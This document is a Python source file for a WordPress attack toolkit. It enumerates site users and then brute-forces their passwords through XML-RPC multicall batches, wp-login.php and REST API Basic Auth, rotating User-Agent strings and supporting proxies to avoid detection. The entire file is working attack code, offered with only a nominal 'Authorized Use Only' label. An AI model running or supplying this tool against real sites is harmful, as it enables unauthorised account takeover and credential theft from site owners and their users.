#A Brute Force and Web Scraping Toolkit-----
import requests
import random
import time
import sys
import os
import argparse
import shutil
from xml.etree import ElementTree as ET
from requests.auth import HTTPBasicAuth

# ===================== CONFIGURATION =====================
VERSION = "1.0" 
DEFAULT_TIMEOUT = 15
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]
# =========================================================

def print_config_summary(args, tester):
    """Display a beautiful configuration summary before starting."""
    terminal_width = shutil.get_terminal_size().columns
    line = "─" * terminal_width

    print(line)
    print(f"  🎯  Target URL          │ {tester.target}")
    print(f"  🚩  In-Scope URL        │ {tester.target.replace('http://','').replace('https://','')}")
    print(f"  📖  Wordlist            │ {args.wordlist if args.wordlist else 'Not specified'}")
    print(f"  👤  Usernames file      │ {args.usernames if args.usernames else 'None (will enumerate)'}")
    print(f"  🚀  Mode                │ {args.mode}")
    print(f"  🔗  Proxy                │ {args.proxy if args.proxy else 'None'}")
    print(f"  ⚙️   Threads             │ {args.threads}")
    print(f"  ⏱️   Delay (sec)         │ {args.delay}")
    print(f"  📦  Batch size (XMLRPC) │ {args.batch}")
    print(f"  ⏳  Timeout (sec)       │ {args.timeout}")
    print(f"  💾  Output file         │ {args.output if args.output else 'None'}")
    print(f"  🔄  Resume file         │ {args.resume if args.resume else 'None'}")
    print(f"  🦡  User-Agent          │ {'Random (built-in)' if not args.user_agents else f'Custom from {args.user_agents}'}")
    print(f"  📂  Users loaded        │ {len(tester.usernames)}")
    print(line)

class WordPressTester:
    def __init__(self, target, wordlist=None, usernames=None, proxy=None, threads=1,
                 delay=1, batch=20, timeout=DEFAULT_TIMEOUT, user_agents=None,
                 output=None, resume=None):
        self.target = target.rstrip('/')
        self.wordlist = wordlist
        self.usernames = usernames if usernames else []
        self.proxy = proxy
        self.threads = threads
        self.delay = delay
        self.batch = batch
        self.timeout = timeout
        self.user_agents = user_agents if user_agents else DEFAULT_USER_AGENTS
        self.output = output
        self.resume = resume
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.found_credentials = []

    def _headers(self):
        return {'User-Agent': random.choice(self.user_agents)}

    def _request(self, method, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('headers', self._headers())
        try:
            return self.session.request(method, url, **kwargs)
        except requests.exceptions.ConnectTimeout:
            print(f"[-] Connection timeout to {url}")
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Connection error: {e}")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
        return None

    # ---------- Connectivity Test ----------
    def test_connection(self):
        """Verify XML‑RPC endpoint is reachable and responsive."""
        xmlrpc_url = f"{self.target}/xmlrpc.php"
        probe = '''<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params/></methodCall>'''
        print("[*] Testing connection to XML‑RPC...")
        resp = self._request('POST', xmlrpc_url, data=probe)
        if resp and resp.status_code == 200 and 'array' in resp.text:
            print("[✓] XML‑RPC is alive and reachable.")
            return True
        else:
            print("[✗] XML‑RPC test failed. Check your proxy, target URL, or network.")
            return False

    # ---------- User Enumeration ----------
    def enumerate_users(self):
        """Discover WordPress users via multiple methods."""
        users = set()
        print("[*] Enumerating users...")

        # Method 1: REST API
        api = f"{self.target}/wp-json/wp/v2/users"
        resp = self._request('GET', api)
        if resp and resp.status_code == 200:
            try:
                for u in resp.json():
                    if 'slug' in u:
                        users.add(u['slug'])
                        print(f"[REST] Found user: {u['slug']}")
            except:
                pass

        # Method 2: Author archives (IDs 1-20)
        for i in range(1, 21):
            url = f"{self.target}/?author={i}"
            resp = self._request('GET', url, allow_redirects=False)
            if resp and 'Location' in resp.headers:
                loc = resp.headers['Location']
                if '/author/' in loc:
                    user = loc.split('/author/')[-1].strip('/')
                    if user:
                        users.add(user)
                        print(f"[AUTHOR] Found user: {user}")
            time.sleep(self.delay)

        # Method 3: oEmbed
        oembed = f"{self.target}/wp-json/oembed/1.0/embed?url={self.target}"
        resp = self._request('GET', oembed)
        if resp and resp.status_code == 200:
            data = resp.json()
            if 'author_name' in data:
                users.add(data['author_name'])
                print(f"[oEMBED] Found user: {data['author_name']}")

        return list(users)

    # ---------- XML-RPC Multicall Attack ----------
    def _build_multicall(self, username, passwords):
        root = ET.Element('methodCall')
        ET.SubElement(root, 'methodName').text = 'system.multicall'
        params = ET.SubElement(root, 'params')
        param = ET.SubElement(params, 'param')
        value = ET.SubElement(param, 'value')
        array = ET.SubElement(value, 'array')
        data = ET.SubElement(array, 'data')

        for pwd in passwords:
            call_value = ET.SubElement(data, 'value')
            struct = ET.SubElement(call_value, 'struct')

            m1 = ET.SubElement(struct, 'member')
            ET.SubElement(m1, 'name').text = 'methodName'
            m1_val = ET.SubElement(m1, 'value')
            m1_val.text = 'wp.getUsersBlogs'

            m2 = ET.SubElement(struct, 'member')
            ET.SubElement(m2, 'name').text = 'params'
            params_val = ET.SubElement(m2, 'value')
            params_array = ET.SubElement(params_val, 'array')
            params_data = ET.SubElement(params_array, 'data')

            u = ET.SubElement(params_data, 'value')
            u.text = username
            p = ET.SubElement(params_data, 'value')
            p.text = pwd

        return ET.tostring(root, encoding='unicode')

    def _check_xmlrpc_success(self, xml_response, passwords):
        """
        Parse XML-RPC multicall response.
        Return the password if any call returned a valid blog list.
        We detect success by the presence of <blogid> (a field inside the struct).
        If the whole response is a top-level fault (batch rejected), return None.
        """
        try:
            root = ET.fromstring(xml_response)

            # If the entire response is a fault (e.g., batch too large)
            if root.find('.//fault') is not None:
                # Optional debug: print("[DEBUG] Server returned a fault for the whole batch.")
                return None

            # Each method response is inside: /methodResponse/params/param/value/array/data/value
            values = root.findall(".//params/param/value/array/data/value")

            for i, val in enumerate(values):
                # If this value contains a fault, it's a failed login
                if val.find(".//fault") is not None:
                    continue

                # Look for a member with name 'blogid' – indicates a successful login
                blogid = val.find(".//name[.='blogid']")
                if blogid is not None:
                    return passwords[i]
        except Exception as e:
            # Optional: uncomment for debugging
            # print(f"[DEBUG] XML parse error: {e}")
            pass
        return None

    def attack_xmlrpc(self, username):
        """Brute-force via XML-RPC multicall with batch progress messages."""
        xmlrpc_url = f"{self.target}/xmlrpc.php"
        print(f"[XMLRPC] Testing user: {username}")
        with open(self.wordlist, 'r', errors='ignore') as f:
            batch = []
            total_attempts = 0
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                batch.append(pwd)
                if len(batch) >= self.batch:
                    total_attempts += len(batch)
                    xml = self._build_multicall(username, batch)
                    resp = self._request('POST', xmlrpc_url, data=xml)
                    if resp and resp.status_code == 200:
                        found = self._check_xmlrpc_success(resp.text, batch)
                        if found:
                            print(f"\n[!!!] XMLRPC SUCCESS: {username}:{found}\n")
                            self.found_credentials.append((username, found))
                            if self.output:
                                with open(self.output, 'a') as out:
                                    out.write(f"{username}:{found}\n")
                            return found
                        else:
                            print(f"[*] Batch of {len(batch)} passwords processed (total {total_attempts}) – no success yet.")
                    else:
                        print(f"[-] Batch request failed (HTTP {resp.status_code if resp else 'no response'})")
                    time.sleep(self.delay)
                    batch = []
            # Last partial batch
            if batch:
                total_attempts += len(batch)
                xml = self._build_multicall(username, batch)
                resp = self._request('POST', xmlrpc_url, data=xml)
                if resp and resp.status_code == 200:
                    found = self._check_xmlrpc_success(resp.text, batch)
                    if found:
                        print(f"\n[!!!] XMLRPC SUCCESS: {username}:{found}\n")
                        self.found_credentials.append((username, found))
                        if self.output:
                            with open(self.output, 'a') as out:
                                out.write(f"{username}:{found}\n")
                        return found
                    else:
                        print(f"[*] Final batch of {len(batch)} passwords processed (total {total_attempts}) – no success.")
                else:
                    print(f"[-] Final batch request failed.")
        return None

    # ---------- wp-login.php Attack ----------
    def attack_wplogin(self, username):
        """Brute-force via wp-login.php POST with progress."""
        login_url = f"{self.target}/wp-login.php"
        print(f"[WPLOGIN] Testing user: {username}")
        with open(self.wordlist, 'r', errors='ignore') as f:
            count = 0
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                count += 1
                data = {
                    'log': username,
                    'pwd': pwd,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{self.target}/wp-admin/",
                    'testcookie': '1'
                }
                resp = self._request('POST', login_url, data=data)
                if resp and 'login_error' not in resp.text and 'wp-admin' in resp.url:
                    print(f"\n[!!!] WPLOGIN SUCCESS: {username}:{pwd}\n")
                    self.found_credentials.append((username, pwd))
                    if self.output:
                        with open(self.output, 'a') as out:
                            out.write(f"{username}:{pwd}\n")
                    return pwd
                if count % 10 == 0:
                    print(f"[*] Tested {count} passwords for {username} – no success yet.")
                time.sleep(self.delay)
        return None

    # ---------- REST API Authentication Attack ----------
    def attack_restapi(self, username):
        """Brute-force via REST API Basic Auth with progress."""
        api_url = f"{self.target}/wp-json/wp/v2/users/me"
        print(f"[RESTAPI] Testing user: {username}")
        with open(self.wordlist, 'r', errors='ignore') as f:
            count = 0
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                count += 1
                resp = self._request('GET', api_url, auth=HTTPBasicAuth(username, pwd))
                if resp and resp.status_code == 200:
                    print(f"\n[!!!] REST API SUCCESS: {username}:{pwd}\n")
                    self.found_credentials.append((username, pwd))
                    if self.output:
                        with open(self.output, 'a') as out:
                            out.write(f"{username}:{pwd}\n")
                    return pwd
                if count % 10 == 0:
                    print(f"[*] Tested {count} passwords for {username} – no success yet.")
                time.sleep(self.delay)
        return None

    # ---------- Main Orchestration ----------
    def run(self, mode):
        # Step 0: Test connectivity for any attack mode except enumeration
        if mode != 'enumerate':
            if not self.test_connection():
                sys.exit(1)

        if mode == 'enumerate':
            users = self.enumerate_users()
            print(f"\n[+] Total users found: {len(users)}")
            if users:
                with open('users.txt', 'w') as f:
                    f.write('\n'.join(users))
                print("[+] Saved to users.txt")
            return

        if not self.wordlist:
            print("[-] Wordlist required for brute-force")
            return

        if not self.usernames:
            print("[*] No usernames provided; enumerating first...")
            self.usernames = self.enumerate_users()
            if not self.usernames:
                print("[-] Could not find any users. Provide usernames manually.")
                return

        for username in self.usernames:
            print(f"\n[>>>] Attacking user: {username}")
            if mode == 'xmlrpc':
                self.attack_xmlrpc(username)
            elif mode == 'wplogin':
                self.attack_wplogin(username)
            elif mode == 'restapi':
                self.attack_restapi(username)
            elif mode == 'all':
                if not self.attack_xmlrpc(username):
                    if not self.attack_wplogin(username):
                        self.attack_restapi(username)
            else:
                print("[-] Unknown mode")
                return

        print("\n[✓] Attack completed.")
        if self.found_credentials:
            print("[+] Credentials found:")
            for u, p in self.found_credentials:
                print(f"    {u}:{p}")
        else:
            print("[-] No credentials found.")


# ===================== MAIN =====================
def main():
    parser = argparse.ArgumentParser(description="WordPress Advanced Testing Toolkit – Final with UI (Authorized Use Only)")
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('-w', '--wordlist', help='Password wordlist file')
    parser.add_argument('-U', '--usernames', help='Username list file (one per line)')
    parser.add_argument('-m', '--mode', choices=['enumerate', 'xmlrpc', 'wplogin', 'restapi', 'all'],
                        default='enumerate', help='Attack mode')
    parser.add_argument('--proxy', help='Proxy URL (e.g., socks5h://localhost:9050)')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Threads (use with caution)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests (seconds)')
    parser.add_argument('--batch', type=int, default=20, help='Batch size for XML-RPC multicall')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout')
    parser.add_argument('--output', help='Output file for found credentials')
    parser.add_argument('--resume', help='File to store/check tested passwords (for resuming)')
    parser.add_argument('--user-agents', help='Custom User-Agent file (one per line)')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')

    args = parser.parse_args()

    if not args.no_banner:
        print(r"""
 ██     ██ ██████  ██       ██████   ██████  ██████   ██████  ███████ ███████ 
 ██     ██ ██   ██ ██      ██    ██ ██       ██   ██ ██    ██ ██      ██      
 ██  █  ██ ██████  ██      ██    ██ ██   ███ ██████  ██    ██ ███████ █████   
 ██ ███ ██ ██      ██      ██    ██ ██    ██ ██      ██    ██      ██ ██      
  ███ ███  ██      ███████  ██████   ██████  ██       ██████  ███████ ███████
    WordPress Testing Toolkit
    by  Mr.valentine(NAYAN) "don't mind the name" 
    For details Visit-             ver: {}
        """.format(VERSION))

    # Load usernames if provided
    usernames = []
    if args.usernames:
        with open(args.usernames, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]

    # Load custom user agents
    user_agents = DEFAULT_USER_AGENTS
    if args.user_agents:
        with open(args.user_agents, 'r') as f:
            user_agents = [line.strip() for line in f if line.strip()]

    tester = WordPressTester(
        target=args.url,
        wordlist=args.wordlist,
        usernames=usernames,
        proxy=args.proxy,
        threads=args.threads,
        delay=args.delay,
        batch=args.batch,
        timeout=args.timeout,
        user_agents=user_agents,
        output=args.output,
        resume=args.resume
    )

    # Display the beautiful configuration summary
    print_config_summary(args, tester)

    # Run the selected mode
    tester.run(args.mode)


if __name__ == '__main__':
    main()
